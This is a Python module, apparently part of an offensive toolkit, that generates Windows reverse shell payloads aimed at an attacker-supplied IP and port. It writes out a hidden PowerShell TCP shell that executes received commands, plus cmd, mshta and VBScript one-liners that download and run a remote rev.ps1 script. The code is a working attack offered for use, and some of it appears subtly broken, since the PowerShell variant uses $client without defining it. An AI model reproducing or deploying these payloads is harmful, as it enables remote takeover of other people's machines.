# payloads/windows/windows_reverse_shell.py

def generate_reverse_shell(ip: str, port: int, shell_type: str = "powershell") -> str:
    """
    Windows için çeşitli reverse shell payload'ları üretir.
    
    :param ip: Saldırgan IP
    :param port: Bağlantı portu
    :param shell_type: powershell, cmd, mshta, vbscript gibi seçenekler
    :return: Payload stringi
    """

    shells = {
        "powershell": (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}}"
        ),
        "cmd": (
            f"cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://{ip}/rev.ps1')"
        ),
        "mshta": (
            f"mshta.exe \"javascript:var r=new ActiveXObject('WScript.Shell');"
            f"r.Run('powershell -c \\\"IEX(New-Object Net.WebClient).DownloadString(\\'{ip}/rev.ps1\\\")\\\"',0);close();\""
        ),
        "vbscript": (
            f"Set objShell = CreateObject(\"WScript.Shell\")\n"
            f"objShell.Run \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('{ip}/rev.ps1')\", 0"
        )
    }

    return shells.get(shell_type.lower(), f"# Unsupported shell type: {shell_type}")
